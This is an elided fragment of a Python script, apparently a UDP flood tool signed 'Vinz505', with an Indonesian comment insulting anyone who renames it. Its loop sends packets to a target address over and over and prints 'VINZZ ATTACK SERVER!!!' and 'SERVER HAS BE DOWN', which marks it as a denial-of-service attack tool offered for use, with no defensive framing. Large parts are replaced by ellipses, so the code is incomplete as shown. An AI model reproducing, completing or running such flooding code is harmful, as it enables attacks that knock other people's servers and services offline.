#TOOLS INI DIBUAT OLEH Vinz505
#HAH LU RENAME TOOLS? KENCING NANAH !!
import random
import socket
import threading
import os
...
print("\033[95m VINZ505 TOOLS \033[95m")
	...
	while True:
		try:
			...
			for x in range(times):
				s.sendto(data,addr)
			print(i +" VINZZ ATTACK SERVER!!!")
		except:
			print("[!] SERVER HAS BE DOWN")
